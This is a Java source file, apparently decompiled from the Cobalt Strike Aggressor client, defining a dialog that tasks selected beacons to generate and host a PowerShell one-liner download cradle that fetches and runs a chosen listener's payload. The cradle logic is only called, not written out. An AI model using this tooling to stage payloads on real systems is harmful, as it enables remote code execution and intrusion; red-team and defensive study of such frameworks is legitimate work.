package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.BeaconEntry;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class OneLinerDialog implements DialogListener {

    protected AggressorClient client;

    protected String[] bids;

    public OneLinerDialog(AggressorClient aggressorClient, String[] arrstring) {
        this.client = aggressorClient;
        this.bids = arrstring;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        String str1 = DialogUtils.string(map, "listener");
        String str2 = DialogUtils.bool(map, "x64") ? "x64" : "x86";
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.bids);
        taskBeacon.input("oneliner " + str2 + " " + str1);
        for (byte b = 0; b < this.bids.length; b++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.client.getData(), this.bids[b]);
            if (beaconEntry != null) {
                taskBeacon.log_task(this.bids[b], "Created PowerShell one-liner to run " + str1 + " (" + str2 + ")", "T1086");
                String str = taskBeacon.SetupPayloadDownloadCradle(this.bids[b], str2, ListenerUtils.getListener(this.client, str1));
                DialogUtils.startedWebService(beaconEntry.title("One-liner for"), str);
            }
        }
    }

    public void show() throws IOException {
        JFrame jFrame = DialogUtils.dialog("PowerShell One-liner", 640, 480);
        DialogManager dialogManager = new DialogManager(jFrame);
        dialogManager.addDialogListener(this);
        dialogManager.sc_listener_all("listener", "Listener:", this.client);
        dialogManager.checkbox_add("x64", "x64:", "Use x64 payload");
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-oneliner");
        jFrame.add(DialogUtils.description("Generate a single use one-liner that runs payload within this session."), "North");
        jFrame.add(dialogManager.layout(), "Center");
        jFrame.add(DialogUtils.center(jButton1, jButton2), "South");
        jFrame.pack();
        jFrame.setVisible(true);
    }
}
